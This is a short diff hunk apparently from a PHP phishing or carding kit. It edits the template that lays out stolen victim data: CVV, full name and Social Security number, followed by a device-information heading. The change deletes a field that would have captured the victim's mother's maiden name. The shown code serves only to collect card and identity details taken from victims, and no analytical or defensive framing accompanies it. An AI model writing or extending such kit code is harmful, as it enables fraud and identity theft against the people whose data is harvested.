@@ -92,7 +92,6 @@ CVV : ".$cvv."
 
 Full Name		            : ".$fn."
 SSN                         : ".$ssn."
-Mother's Maiden Name        : ".$mmn."
 
 #------------------------[ DEVICE INFORMATION ]-----------------------#
 
